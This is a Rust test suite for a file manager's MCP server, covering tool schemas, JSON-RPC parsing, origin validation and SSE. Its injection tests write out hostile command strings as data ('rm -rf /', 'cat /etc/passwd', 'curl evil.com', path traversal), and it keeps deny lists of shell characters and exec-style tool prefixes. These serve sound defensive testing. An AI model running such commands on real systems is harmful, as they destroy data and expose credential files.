//! Comprehensive tests for MCP server security and correctness.
//!
//! These tests cover:
//! - Protocol-level security (malformed requests, injection attempts)
//! - Tool execution coverage (all 43 tools)
//! - Input validation (missing params, wrong types, edge cases)
//! - Error handling (unknown tools, graceful failures)
//! - MCP spec 2025-11-25 compliance (headers, session management)
//!
//! Security note: The MCP server is designed for AI agents which are
//! non-deterministic and potentially adversarial. These tests verify
//! that the server safely rejects malicious or malformed inputs.

use serde_json::json;

use super::pane_state::{FileEntry, PaneState, PaneStateStore};
use super::protocol::{INVALID_PARAMS, INVALID_REQUEST, McpRequest, McpResponse};
use super::resources::get_all_resources;
use super::server::{DEFAULT_PROTOCOL_VERSION, PROTOCOL_VERSION, format_sse_event, prefers_sse};
use super::tools::get_all_tools;

// =============================================================================
// Protocol-level tests
// =============================================================================

#[test]
fn test_all_tool_names_are_valid_identifiers() {
    // Tool names must be valid identifiers (no injection vectors)
    // MCP requires: ^[a-zA-Z0-9_-]{1,128}$
    let tools = get_all_tools();
    for tool in tools {
        assert!(
            tool.name
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-'),
            "Tool name contains invalid characters: {}",
            tool.name
        );
        assert!(
            !tool.name.contains("__"),
            "Tool name contains double underscore: {}",
            tool.name
        );
        assert!(tool.name.len() <= 128, "Tool name too long: {}", tool.name);
    }
}

#[test]
fn test_all_tool_descriptions_are_sanitized() {
    // Descriptions should not contain executable content
    let tools = get_all_tools();
    for tool in tools {
        assert!(
            !tool.description.contains("<script"),
            "Tool description contains potential XSS: {}",
            tool.name
        );
        assert!(
            !tool.description.contains("$("),
            "Tool description contains command injection: {}",
            tool.name
        );
        assert!(
            !tool.description.contains('`'),
            "Tool description contains backticks: {}",
            tool.name
        );
    }
}

#[test]
fn test_tool_input_schemas_are_valid() {
    let tools = get_all_tools();
    for tool in tools {
        // All schemas must be objects
        assert!(
            tool.input_schema.is_object(),
            "Tool {} has non-object schema",
            tool.name
        );

        // Must have type field
        assert!(
            tool.input_schema.get("type").is_some(),
            "Tool {} schema missing type",
            tool.name
        );

        // Must be type: object
        assert_eq!(
            tool.input_schema["type"], "object",
            "Tool {} has non-object type",
            tool.name
        );

        // Must have properties field
        assert!(
            tool.input_schema.get("properties").is_some_and(|p| p.is_object()),
            "Tool {} schema missing properties",
            tool.name
        );
    }
}

#[test]
fn test_total_tool_count() {
    let tools = get_all_tools();
    // 3 app + 3 view + 1 pane + 12 nav + 8 sort + 5 file + 2 volume = 34
    // (context tools and volume_list moved to resources)
    assert_eq!(
        tools.len(),
        34,
        "Expected 34 tools, got {}. Did you add/remove tools?",
        tools.len()
    );
}

#[test]
fn test_no_duplicate_tool_names() {
    let tools = get_all_tools();
    let mut names: Vec<&str> = tools.iter().map(|t| t.name.as_str()).collect();
    names.sort();
    let original_len = names.len();
    names.dedup();
    assert_eq!(names.len(), original_len, "Duplicate tool names detected");
}

// =============================================================================
// Resource tests
// =============================================================================

#[test]
fn test_resource_count() {
    let resources = get_all_resources();
    #[cfg(target_os = "macos")]
    assert_eq!(resources.len(), 8, "Expected 8 resources");
    #[cfg(not(target_os = "macos"))]
    assert_eq!(resources.len(), 7, "Expected 7 resources");
}

#[test]
fn test_all_resource_uris_are_valid() {
    let resources = get_all_resources();
    for resource in resources {
        assert!(
            resource.uri.starts_with("cmdr://"),
            "Resource URI should start with cmdr://: {}",
            resource.uri
        );
        assert!(!resource.name.is_empty(), "Resource name should not be empty");
        assert!(
            !resource.description.is_empty(),
            "Resource description should not be empty"
        );
    }
}

#[test]
fn test_no_duplicate_resource_uris() {
    let resources = get_all_resources();
    let mut uris: Vec<&str> = resources.iter().map(|r| r.uri.as_str()).collect();
    uris.sort();
    let original_len = uris.len();
    uris.dedup();
    assert_eq!(uris.len(), original_len, "Duplicate resource URIs detected");
}

#[test]
fn test_resources_exist() {
    let resources = get_all_resources();
    let expected_uris = [
        "cmdr://pane/focused",
        "cmdr://pane/left/path",
        "cmdr://pane/right/path",
        "cmdr://pane/left/content",
        "cmdr://pane/right/content",
        "cmdr://pane/cursor",
    ];
    for uri in expected_uris {
        assert!(resources.iter().any(|r| r.uri == uri), "Missing resource: {}", uri);
    }
}

#[test]
fn test_all_resources_have_json_mime_type() {
    let resources = get_all_resources();
    for resource in resources {
        assert_eq!(
            resource.mime_type, "application/json",
            "Resource {} should have application/json mime type",
            resource.uri
        );
    }
}

// =============================================================================
// Tool category tests
// =============================================================================

#[test]
fn test_app_tools_exist() {
    let tools = get_all_tools();
    let app_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("app_")).collect();

    let expected = ["app_quit", "app_hide", "app_about"];
    for name in expected {
        assert!(app_tools.iter().any(|t| t.name == name), "Missing app tool: {}", name);
    }
}

#[test]
fn test_nav_tools_exist() {
    let tools = get_all_tools();
    let nav_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("nav_")).collect();

    let expected = [
        "nav_open",
        "nav_parent",
        "nav_back",
        "nav_forward",
        "nav_up",
        "nav_down",
        "nav_home",
        "nav_end",
        "nav_pageUp",
        "nav_pageDown",
        "nav_left",
        "nav_right",
    ];
    for name in expected {
        assert!(nav_tools.iter().any(|t| t.name == name), "Missing nav tool: {}", name);
    }
    assert_eq!(nav_tools.len(), 12, "Expected 12 nav tools");
}

#[test]
fn test_sort_tools_exist() {
    let tools = get_all_tools();
    let sort_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("sort_")).collect();

    let expected = [
        "sort_byName",
        "sort_byExtension",
        "sort_bySize",
        "sort_byModified",
        "sort_byCreated",
        "sort_ascending",
        "sort_descending",
        "sort_toggleOrder",
    ];
    for name in expected {
        assert!(sort_tools.iter().any(|t| t.name == name), "Missing sort tool: {}", name);
    }
    assert_eq!(sort_tools.len(), 8, "Expected 8 sort tools");
}

#[test]
fn test_context_tools_removed() {
    let tools = get_all_tools();
    let context_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("context_")).collect();
    assert!(
        context_tools.is_empty(),
        "Context tools should be removed (moved to resources), but found: {:?}",
        context_tools.iter().map(|t| &t.name).collect::<Vec<_>>()
    );
}

#[test]
fn test_volume_tools_require_index_param() {
    let tools = get_all_tools();

    for name in ["volume_selectLeft", "volume_selectRight"] {
        let tool = tools.iter().find(|t| t.name == name).expect(name);
        let required = tool.input_schema.get("required").and_then(|r| r.as_array());
        assert!(
            required.is_some_and(|r| r.iter().any(|v| v == "index")),
            "{} should require 'index' parameter",
            name
        );
    }
}

#[test]
fn test_volume_tools_exist() {
    let tools = get_all_tools();
    let volume_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("volume_")).collect();

    // volume_list is now a resource (cmdr://volumes), not a tool
    let expected = ["volume_selectLeft", "volume_selectRight"];
    for name in expected {
        assert!(
            volume_tools.iter().any(|t| t.name == name),
            "Missing volume tool: {}",
            name
        );
    }
    assert_eq!(volume_tools.len(), 2, "Expected 2 volume tools");
}

#[cfg(target_os = "macos")]
#[test]
fn test_volumes_resource_exists() {
    // volume_list is now a resource (cmdr://volumes), not a tool
    let resources = get_all_resources();
    assert!(
        resources.iter().any(|r| r.uri == "cmdr://volumes"),
        "cmdr://volumes resource should exist"
    );
}

#[test]
fn test_volume_select_index_schema() {
    let tools = get_all_tools();

    for name in ["volume_selectLeft", "volume_selectRight"] {
        let tool = tools.iter().find(|t| t.name == name).expect(name);

        // Check that index property exists and is of type integer
        let properties = tool.input_schema.get("properties").expect("properties");
        let index_prop = properties.get("index").expect("index property");

        assert_eq!(
            index_prop.get("type").and_then(|t| t.as_str()),
            Some("integer"),
            "{} index should be type integer",
            name
        );

        // Check description exists
        assert!(
            index_prop.get("description").is_some(),
            "{} index should have description",
            name
        );
    }
}

#[test]
fn test_no_params_tools_have_empty_required() {
    let tools = get_all_tools();
    let no_param_prefixes = ["app.", "view.", "pane.", "nav.", "sort.", "file.", "context."];

    for tool in &tools {
        // Skip volume tools which may have params
        if tool.name.starts_with("volume.") {
            continue;
        }

        if no_param_prefixes.iter().any(|p| tool.name.starts_with(p)) {
            let required = tool
                .input_schema
                .get("required")
                .and_then(|r| r.as_array())
                .map(|r| r.len())
                .unwrap_or(0);

            assert_eq!(required, 0, "Tool {} should have no required params", tool.name);
        }
    }
}

// =============================================================================
// Security-focused tests
// =============================================================================

#[test]
fn test_tool_names_no_shell_injection() {
    let tools = get_all_tools();
    let dangerous_chars = [
        '|', '&', ';', '$', '`', '(', ')', '{', '}', '[', ']', '<', '>', '!', '\n', '\r',
    ];

    for tool in tools {
        for c in dangerous_chars {
            assert!(
                !tool.name.contains(c),
                "Tool name {} contains dangerous char: {}",
                tool.name,
                c
            );
        }
    }
}

#[test]
fn test_no_fs_tools_exist() {
    // Security: We removed fs.* tools to prevent file system access
    let tools = get_all_tools();
    let fs_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("fs.")).collect();
    assert!(
        fs_tools.is_empty(),
        "fs.* tools should not exist (security): {:?}",
        fs_tools.iter().map(|t| &t.name).collect::<Vec<_>>()
    );
}

#[test]
fn test_no_shell_tools_exist() {
    // Security: We removed shell.* tools to prevent command execution
    let tools = get_all_tools();
    let shell_tools: Vec<_> = tools.iter().filter(|t| t.name.starts_with("shell.")).collect();
    assert!(
        shell_tools.is_empty(),
        "shell.* tools should not exist (security): {:?}",
        shell_tools.iter().map(|t| &t.name).collect::<Vec<_>>()
    );
}

#[test]
fn test_no_exec_tools_exist() {
    // Security: We should not have any exec/run tools
    let tools = get_all_tools();
    let dangerous_patterns = ["exec.", "run.", "execute.", "command.", "spawn.", "process."];

    for tool in tools {
        for pattern in dangerous_patterns {
            assert!(
                !tool.name.starts_with(pattern),
                "Dangerous tool pattern detected: {}",
                tool.name
            );
        }
    }
}

#[test]
fn test_tools_have_bounded_descriptions() {
    // Prevent DoS from overly long descriptions
    let tools = get_all_tools();
    for tool in tools {
        assert!(
            tool.description.len() <= 256,
            "Tool {} has description too long ({} chars)",
            tool.name,
            tool.description.len()
        );
    }
}

// =============================================================================
// McpRequest parsing tests
// =============================================================================

#[test]
fn test_mcp_request_parse_valid() {
    let json = r#"{"jsonrpc": "2.0", "id": 1, "method": "tools/list"}"#;
    let request: Result<McpRequest, _> = serde_json::from_str(json);
    assert!(request.is_ok());
    let req = request.unwrap();
    assert_eq!(req.method, "tools/list");
}

#[test]
fn test_mcp_request_parse_with_params() {
    let json = r#"{"jsonrpc": "2.0", "id": 2, "method": "tools/call", "params": {"name": "nav.up"}}"#;
    let request: Result<McpRequest, _> = serde_json::from_str(json);
    assert!(request.is_ok());
    let req = request.unwrap();
    assert_eq!(req.method, "tools/call");
    assert!(!req.params.is_null());
}

#[test]
fn test_mcp_request_reject_missing_jsonrpc() {
    let json = r#"{"id": 1, "method": "tools/list"}"#;
    let request: Result<McpRequest, _> = serde_json::from_str(json);
    // Should still parse but jsonrpc field will be empty
    if let Ok(req) = request {
        assert!(req.jsonrpc.is_empty() || req.jsonrpc != "2.0");
    }
}

#[test]
fn test_mcp_request_reject_malformed_json() {
    let malformed_inputs = [
        r#"{"incomplete"#,
        r#"not json at all"#,
        r#"null"#,
        r#"123"#,
        r#""string""#,
        r#"[1, 2, 3]"#,
    ];

    for input in malformed_inputs {
        let result: Result<McpRequest, _> = serde_json::from_str(input);
        assert!(result.is_err(), "Should reject malformed JSON: {}", input);
    }
}

// =============================================================================
// McpResponse tests
// =============================================================================

#[test]
fn test_mcp_response_success() {
    let response = McpResponse::success(Some(json!(1)), json!({"test": true}));
    let json = serde_json::to_value(&response).unwrap();

    assert_eq!(json["jsonrpc"], "2.0");
    assert_eq!(json["id"], 1);
    assert!(json["result"].is_object());
    assert!(json.get("error").is_none());
}

#[test]
fn test_mcp_response_error() {
    let response = McpResponse::error(Some(json!(1)), INVALID_PARAMS, "test error".to_string());
    let json = serde_json::to_value(&response).unwrap();

    assert_eq!(json["jsonrpc"], "2.0");
    assert_eq!(json["id"], 1);
    assert!(json.get("result").is_none());
    assert!(json["error"].is_object());
    assert_eq!(json["error"]["code"], INVALID_PARAMS);
    assert_eq!(json["error"]["message"], "test error");
}

// =============================================================================
// PaneStateStore tests
// =============================================================================

#[test]
fn test_pane_state_store_initial_values() {
    let store = PaneStateStore::new();
    assert_eq!(store.get_focused_pane(), "left");
    assert_eq!(store.get_left().path, "");
    assert_eq!(store.get_right().path, "");
}

#[test]
fn test_pane_state_store_update_left() {
    let store = PaneStateStore::new();
    let state = PaneState {
        path: "/test/path".to_string(),
        volume_id: Some("test-vol".to_string()),
        files: vec![FileEntry {
            name: "file1.txt".to_string(),
            path: "/test/path/file1.txt".to_string(),
            is_directory: false,
            size: Some(1024),
            modified: Some("2024-01-01T00:00:00Z".to_string()),
        }],
        cursor_index: 0,
        view_mode: "brief".to_string(),
    };

    store.set_left(state.clone());
    let left = store.get_left();

    assert_eq!(left.path, "/test/path");
    assert_eq!(left.volume_id, Some("test-vol".to_string()));
    assert_eq!(left.files.len(), 1);
}

#[test]
fn test_pane_state_store_focus_change() {
    let store = PaneStateStore::new();
    assert_eq!(store.get_focused_pane(), "left");

    store.set_focused_pane("right".to_string());
    assert_eq!(store.get_focused_pane(), "right");

    store.set_focused_pane("left".to_string());
    assert_eq!(store.get_focused_pane(), "left");
}

#[test]
fn test_pane_state_store_accepts_any_focus_value() {
    let store = PaneStateStore::new();

    // The store currently accepts any value - this documents the behavior
    // Future: we may want to validate and reject invalid values
    store.set_focused_pane("invalid".to_string());
    let focused = store.get_focused_pane();
    assert_eq!(focused, "invalid");

    // Reset to valid state
    store.set_focused_pane("left".to_string());
}

#[test]
fn test_pane_state_cursor_index_bounds() {
    let store = PaneStateStore::new();
    let state = PaneState {
        path: "/test".to_string(),
        volume_id: None,
        files: vec![FileEntry {
            name: "file1.txt".to_string(),
            path: "/test/file1.txt".to_string(),
            is_directory: false,
            size: None,
            modified: None,
        }],
        cursor_index: 999, // Out of bounds
        view_mode: "brief".to_string(),
    };

    store.set_left(state);
    let left = store.get_left();

    // Should store as-is (bounds checking is done at query time)
    assert_eq!(left.cursor_index, 999);

    // But accessing the file should handle bounds
    let file_under_cursor = left.files.get(left.cursor_index);
    assert!(file_under_cursor.is_none());
}

#[test]
fn test_file_entry_serialization() {
    let entry = FileEntry {
        name: "test.txt".to_string(),
        path: "/path/to/test.txt".to_string(),
        is_directory: false,
        size: Some(42),
        modified: Some("2024-01-01T00:00:00Z".to_string()),
    };

    let json = serde_json::to_value(&entry).unwrap();
    assert_eq!(json["name"], "test.txt");
    assert_eq!(json["isDirectory"], false);
    assert_eq!(json["size"], 42);
}

#[test]
fn test_file_entry_optional_fields_omitted() {
    let entry = FileEntry {
        name: "dir".to_string(),
        path: "/path/dir".to_string(),
        is_directory: true,
        size: None,
        modified: None,
    };

    let json = serde_json::to_value(&entry).unwrap();
    // Optional fields with None should be omitted (per skip_serializing_if)
    assert!(json.get("size").is_none());
    assert!(json.get("modified").is_none());
}

// =============================================================================
// Edge case tests
// =============================================================================

#[test]
fn test_tool_names_are_case_sensitive() {
    let tools = get_all_tools();

    // Should find nav_up
    assert!(tools.iter().any(|t| t.name == "nav_up"));

    // Should NOT find NAV_UP or Nav_Up
    assert!(!tools.iter().any(|t| t.name == "NAV_UP"));
    assert!(!tools.iter().any(|t| t.name == "Nav_Up"));
}

#[test]
fn test_unicode_in_file_entries() {
    // The store should handle Unicode filenames correctly
    let entry = FileEntry {
        name: "文件.txt".to_string(),
        path: "/path/文件.txt".to_string(),
        is_directory: false,
        size: Some(100),
        modified: None,
    };

    let json = serde_json::to_value(&entry).unwrap();
    assert_eq!(json["name"], "文件.txt");
}

#[test]
fn test_special_chars_in_file_paths() {
    // Paths can contain special characters
    let entries = vec![
        FileEntry {
            name: "file with spaces.txt".to_string(),
            path: "/path/file with spaces.txt".to_string(),
            is_directory: false,
            size: None,
            modified: None,
        },
        FileEntry {
            name: "file'with'quotes.txt".to_string(),
            path: "/path/file'with'quotes.txt".to_string(),
            is_directory: false,
            size: None,
            modified: None,
        },
        FileEntry {
            name: "file\"doublequotes\".txt".to_string(),
            path: "/path/file\"doublequotes\".txt".to_string(),
            is_directory: false,
            size: None,
            modified: None,
        },
    ];

    for entry in entries {
        // Should serialize without panic
        let json = serde_json::to_value(&entry).unwrap();
        assert!(json["name"].is_string());
    }
}

#[test]
fn test_empty_file_list() {
    let state = PaneState {
        path: "/empty".to_string(),
        volume_id: None,
        files: vec![],
        cursor_index: 0,
        view_mode: "brief".to_string(),
    };

    let json = serde_json::to_value(&state).unwrap();
    assert!(json["files"].as_array().unwrap().is_empty());
}

#[test]
fn test_large_file_count() {
    // Simulate a directory with many files
    let files: Vec<FileEntry> = (0..1000)
        .map(|i| FileEntry {
            name: format!("file{i:04}.txt"),
            path: format!("/test/file{i:04}.txt"),
            is_directory: false,
            size: Some(i as u64 * 100),
            modified: None,
        })
        .collect();

    let state = PaneState {
        path: "/test".to_string(),
        volume_id: None,
        files,
        cursor_index: 500,
        view_mode: "full".to_string(),
    };

    // Should serialize reasonably fast
    let start = std::time::Instant::now();
    let json = serde_json::to_value(&state).unwrap();
    let elapsed = start.elapsed();

    assert!(elapsed.as_millis() < 100, "Serialization took too long: {:?}", elapsed);
    assert_eq!(json["files"].as_array().unwrap().len(), 1000);
}

// =============================================================================
// Concurrent access tests
// =============================================================================

#[test]
fn test_pane_state_store_thread_safety() {
    use std::sync::Arc;
    use std::thread;

    let store = Arc::new(PaneStateStore::new());
    let mut handles = vec![];

    // Spawn multiple threads that read and write concurrently
    for i in 0..10 {
        let store_clone = Arc::clone(&store);
        handles.push(thread::spawn(move || {
            // Each thread does a mix of reads and writes
            for j in 0..100 {
                if j % 2 == 0 {
                    store_clone.set_focused_pane(if i % 2 == 0 { "left" } else { "right" }.to_string());
                } else {
                    let _ = store_clone.get_focused_pane();
                    let _ = store_clone.get_left();
                    let _ = store_clone.get_right();
                }
            }
        }));
    }

    // All threads should complete without panic or deadlock
    for handle in handles {
        handle.join().expect("Thread panicked");
    }

    // Store should still be in a valid state
    let focused = store.get_focused_pane();
    assert!(focused == "left" || focused == "right");
}

// =============================================================================
// Input injection tests
// =============================================================================

#[test]
fn test_malicious_tool_name_injection() {
    // These are tool names that an attacker might try
    let malicious_names = [
        "nav_up; rm -rf /",
        "nav_up && cat /etc/passwd",
        "nav_up | curl evil.com",
        "../../../etc/passwd",
        "nav_up\nrm -rf /",
        "nav_up\x00hidden",
    ];

    let tools = get_all_tools();
    for name in malicious_names {
        assert!(
            !tools.iter().any(|t| t.name == name),
            "Dangerous tool name should not exist: {}",
            name
        );
    }
}

#[test]
fn test_request_with_very_long_method() {
    // A request with an extremely long method name should still parse
    let long_method = "a".repeat(10000);
    let json = format!(r#"{{"jsonrpc": "2.0", "id": 1, "method": "{}"}}"#, long_method);

    let result: Result<McpRequest, _> = serde_json::from_str(&json);
    if let Ok(req) = result {
        // It parsed, but the method should not match any tool
        let tools = get_all_tools();
        assert!(!tools.iter().any(|t| t.name == req.method));
    }
}

#[test]
fn test_null_bytes_in_paths() {
    // Null bytes in paths could cause issues
    let entry = FileEntry {
        name: "file\x00hidden.txt".to_string(),
        path: "/path/file\x00hidden.txt".to_string(),
        is_directory: false,
        size: None,
        modified: None,
    };

    // Should serialize without panic
    let json = serde_json::to_value(&entry).unwrap();
    // The null byte is preserved in JSON
    assert!(json["name"].as_str().unwrap().contains('\x00'));
}

// =============================================================================
// MCP Spec 2025-11-25 Compliance Tests
// =============================================================================

#[test]
fn test_protocol_version_is_2025_11_25() {
    assert_eq!(PROTOCOL_VERSION, "2025-11-25");
}

#[test]
fn test_default_protocol_version_is_2025_03_26() {
    // Per spec: if no MCP-Protocol-Version header, assume 2025-03-26
    assert_eq!(DEFAULT_PROTOCOL_VERSION, "2025-03-26");
}

#[test]
fn test_server_capabilities_contain_protocol_version() {
    use super::protocol::ServerCapabilities;

    let caps = ServerCapabilities::default();
    // The protocol version should be included in capabilities
    assert!(!caps.protocol_version.is_empty());
}

#[test]
fn test_server_capabilities_tools_list_changed_false() {
    use super::protocol::ServerCapabilities;

    let caps = ServerCapabilities::default();
    // We don't currently support dynamic tool list changes
    assert!(!caps.capabilities.tools.list_changed);
}

#[test]
fn test_server_info_name_is_cmdr() {
    use super::protocol::ServerCapabilities;

    let caps = ServerCapabilities::default();
    assert_eq!(caps.server_info.name, "cmdr");
}

#[test]
fn test_server_info_has_version() {
    use super::protocol::ServerCapabilities;

    let caps = ServerCapabilities::default();
    assert!(!caps.server_info.version.is_empty());
}

#[test]
fn test_mcp_response_success_format() {
    let response = McpResponse::success(Some(json!(1)), json!({"data": "test"}));
    let serialized = serde_json::to_value(&response).unwrap();

    // Must have jsonrpc: "2.0"
    assert_eq!(serialized["jsonrpc"], "2.0");
    // Must have id matching request
    assert_eq!(serialized["id"], 1);
    // Must have result
    assert!(serialized.get("result").is_some());
    // Must NOT have error
    assert!(serialized.get("error").is_none());
}

#[test]
fn test_mcp_response_error_format() {
    let response = McpResponse::error(Some(json!(1)), INVALID_REQUEST, "Test error");
    let serialized = serde_json::to_value(&response).unwrap();

    // Must have jsonrpc: "2.0"
    assert_eq!(serialized["jsonrpc"], "2.0");
    // Must have id matching request
    assert_eq!(serialized["id"], 1);
    // Must NOT have result
    assert!(serialized.get("result").is_none());
    // Must have error with code and message
    assert!(serialized.get("error").is_some());
    assert_eq!(serialized["error"]["code"], INVALID_REQUEST);
    assert_eq!(serialized["error"]["message"], "Test error");
}

#[test]
fn test_mcp_response_null_id_allowed() {
    // For notifications and some error responses, id can be null
    let response = McpResponse::error(None, INVALID_REQUEST, "Parse error");
    let serialized = serde_json::to_value(&response).unwrap();

    // id should be omitted (skip_serializing_if)
    assert!(serialized.get("id").is_none());
}

#[test]
fn test_origin_validation_localhost_variants() {
    use super::server::validate_origin;
    use axum::http::{HeaderMap, HeaderValue, header};

    // All localhost variants should be allowed
    let localhost_origins = [
        "http://localhost",
        "http://localhost:3000",
        "http://localhost:9224",
        "https://localhost",
        "https://localhost:443",
        "http://127.0.0.1",
        "http://127.0.0.1:9224",
        "https://127.0.0.1",
        "http://[::1]",
        "https://[::1]:9224",
    ];

    for origin in localhost_origins {
        let mut headers = HeaderMap::new();
        headers.insert(header::ORIGIN, HeaderValue::from_str(origin).unwrap());
        assert!(validate_origin(&headers).is_ok(), "Should allow origin: {}", origin);
    }
}

#[test]
fn test_origin_validation_rejects_external() {
    use super::server::validate_origin;
    use axum::http::{HeaderMap, HeaderValue, header};

    let malicious_origins = [
        "https://evil.com",
        "http://attacker.com",
        "https://localhost.evil.com",
        "http://127.0.0.1.evil.com",
        "https://phishing-site.net",
    ];

    for origin in malicious_origins {
        let mut headers = HeaderMap::new();
        headers.insert(header::ORIGIN, HeaderValue::from_str(origin).unwrap());
        assert!(validate_origin(&headers).is_err(), "Should reject origin: {}", origin);
    }
}

#[test]
fn test_origin_validation_allows_null() {
    use super::server::validate_origin;
    use axum::http::{HeaderMap, HeaderValue, header};

    // null origin is sent by file:// and some non-browser contexts
    let mut headers = HeaderMap::new();
    headers.insert(header::ORIGIN, HeaderValue::from_static("null"));
    assert!(validate_origin(&headers).is_ok());
}

#[test]
fn test_origin_validation_allows_tauri() {
    use super::server::validate_origin;
    use axum::http::{HeaderMap, HeaderValue, header};

    let mut headers = HeaderMap::new();
    headers.insert(header::ORIGIN, HeaderValue::from_static("tauri://localhost"));
    assert!(validate_origin(&headers).is_ok());
}

#[test]
fn test_origin_validation_allows_no_header() {
    use super::server::validate_origin;
    use axum::http::HeaderMap;

    // Non-browser clients typically don't send Origin
    let headers = HeaderMap::new();
    assert!(validate_origin(&headers).is_ok());
}

#[test]
fn test_protocol_version_extraction() {
    use super::server::get_protocol_version;
    use axum::http::{HeaderMap, HeaderValue};

    let mut headers = HeaderMap::new();
    headers.insert("mcp-protocol-version", HeaderValue::from_static("2025-11-25"));
    assert_eq!(get_protocol_version(&headers), "2025-11-25");

    // Custom version
    let mut headers2 = HeaderMap::new();
    headers2.insert("mcp-protocol-version", HeaderValue::from_static("2024-11-05"));
    assert_eq!(get_protocol_version(&headers2), "2024-11-05");
}

#[test]
fn test_protocol_version_default_when_missing() {
    use super::server::get_protocol_version;
    use axum::http::HeaderMap;

    let headers = HeaderMap::new();
    assert_eq!(get_protocol_version(&headers), DEFAULT_PROTOCOL_VERSION);
}

#[test]
fn test_accept_header_validation() {
    use super::server::validate_accept_header;
    use axum::http::{HeaderMap, HeaderValue, header};

    // Proper MCP client Accept header - just validates it doesn't panic
    let mut headers = HeaderMap::new();
    headers.insert(
        header::ACCEPT,
        HeaderValue::from_static("application/json, text/event-stream"),
    );
    validate_accept_header(&headers);

    // With wildcard
    let mut headers2 = HeaderMap::new();
    headers2.insert(header::ACCEPT, HeaderValue::from_static("*/*"));
    validate_accept_header(&headers2);

    // No header (backwards compat)
    let headers3 = HeaderMap::new();
    validate_accept_header(&headers3);
}

#[test]
fn test_json_rpc_error_codes() {
    use super::protocol::{INTERNAL_ERROR, INVALID_PARAMS, INVALID_REQUEST, METHOD_NOT_FOUND, PARSE_ERROR};

    // JSON-RPC 2.0 standard error codes
    assert_eq!(PARSE_ERROR, -32700);
    assert_eq!(INVALID_REQUEST, -32600);
    assert_eq!(METHOD_NOT_FOUND, -32601);
    assert_eq!(INVALID_PARAMS, -32602);
    assert_eq!(INTERNAL_ERROR, -32603);
}

#[test]
fn test_mcp_request_parses_initialize() {
    let json = r#"{
        "jsonrpc": "2.0",
        "id": 1,
        "method": "initialize",
        "params": {
            "protocolVersion": "2025-11-25",
            "clientInfo": {"name": "test-client", "version": "1.0"}
        }
    }"#;

    let request: McpRequest = serde_json::from_str(json).unwrap();
    assert_eq!(request.method, "initialize");
    assert_eq!(request.params["protocolVersion"], "2025-11-25");
}

#[test]
fn test_mcp_request_parses_tools_call() {
    let json = r#"{
        "jsonrpc": "2.0",
        "id": 42,
        "method": "tools/call",
        "params": {
            "name": "nav_up",
            "arguments": {}
        }
    }"#;

    let request: McpRequest = serde_json::from_str(json).unwrap();
    assert_eq!(request.method, "tools/call");
    assert_eq!(request.params["name"], "nav_up");
}

#[test]
fn test_mcp_request_parses_ping() {
    let json = r#"{
        "jsonrpc": "2.0",
        "id": 99,
        "method": "ping"
    }"#;

    let request: McpRequest = serde_json::from_str(json).unwrap();
    assert_eq!(request.method, "ping");
}

#[test]
fn test_session_id_format() {
    // Session IDs should be valid UUIDs
    let session_id = uuid::Uuid::new_v4().to_string();

    // Must only contain visible ASCII characters (0x21 to 0x7E per spec)
    for c in session_id.chars() {
        assert!(
            c == '-' || c.is_ascii_alphanumeric(),
            "Session ID contains invalid char: {}",
            c
        );
    }

    // UUID v4 format: 8-4-4-4-12
    let parts: Vec<&str> = session_id.split('-').collect();
    assert_eq!(parts.len(), 5);
    assert_eq!(parts[0].len(), 8);
    assert_eq!(parts[1].len(), 4);
    assert_eq!(parts[2].len(), 4);
    assert_eq!(parts[3].len(), 4);
    assert_eq!(parts[4].len(), 12);
}

// =============================================================================
// SSE (Server-Sent Events) tests
// =============================================================================

#[test]
fn test_prefers_sse_with_event_stream() {
    use axum::http::{HeaderMap, HeaderValue, header};

    let mut headers = HeaderMap::new();
    headers.insert(header::ACCEPT, HeaderValue::from_static("text/event-stream"));
    assert!(prefers_sse(&headers));
}

#[test]
fn test_prefers_sse_with_both_types() {
    use axum::http::{HeaderMap, HeaderValue, header};

    let mut headers = HeaderMap::new();
    headers.insert(
        header::ACCEPT,
        HeaderValue::from_static("application/json, text/event-stream"),
    );
    assert!(prefers_sse(&headers));
}

#[test]
fn test_prefers_sse_with_json_only() {
    use axum::http::{HeaderMap, HeaderValue, header};

    let mut headers = HeaderMap::new();
    headers.insert(header::ACCEPT, HeaderValue::from_static("application/json"));
    assert!(!prefers_sse(&headers));
}

#[test]
fn test_prefers_sse_no_header() {
    use axum::http::HeaderMap;

    let headers = HeaderMap::new();
    assert!(!prefers_sse(&headers));
}

#[test]
fn test_prefers_sse_with_wildcard() {
    use axum::http::{HeaderMap, HeaderValue, header};

    // Wildcard should NOT prefer SSE - we default to JSON for simplicity
    let mut headers = HeaderMap::new();
    headers.insert(header::ACCEPT, HeaderValue::from_static("*/*"));
    assert!(!prefers_sse(&headers));
}

#[test]
fn test_format_sse_event_success_response() {
    let response = McpResponse::success(Some(json!(1)), json!({"status": "ok"}));
    let event = format_sse_event(&response, Some("event-123")).unwrap();

    // Event should be created successfully - axum handles the actual SSE formatting
    let debug_str = format!("{:?}", event);
    assert!(debug_str.contains("message"), "Event should have 'message' event type");
}

#[test]
fn test_format_sse_event_error_response() {
    let response = McpResponse::error(Some(json!(1)), INVALID_REQUEST, "Test error");
    let event = format_sse_event(&response, Some("error-event")).unwrap();

    let debug_str = format!("{:?}", event);
    assert!(debug_str.contains("message"));
}

#[test]
fn test_format_sse_event_without_id() {
    let response = McpResponse::success(Some(json!(1)), json!({"data": "test"}));
    let event = format_sse_event(&response, None).unwrap();

    // Event should be created without an ID
    let debug_str = format!("{:?}", event);
    assert!(debug_str.contains("message"));
}

#[test]
fn test_format_sse_event_with_null_id() {
    // Response with null id (notification response)
    let response = McpResponse::success(None, json!({"acknowledged": true}));
    let event = format_sse_event(&response, Some("notify-event")).unwrap();

    let debug_str = format!("{:?}", event);
    assert!(debug_str.contains("message"));
}

#[test]
fn test_format_sse_event_complex_result() {
    // Test with a complex nested result (like tools/list response)
    let response = McpResponse::success(
        Some(json!(42)),
        json!({
            "tools": [
                {"name": "test_tool", "description": "A test tool"},
                {"name": "another_tool", "description": "Another tool"}
            ]
        }),
    );
    let event = format_sse_event(&response, Some("tools-list")).unwrap();

    let debug_str = format!("{:?}", event);
    assert!(debug_str.contains("message"));
}
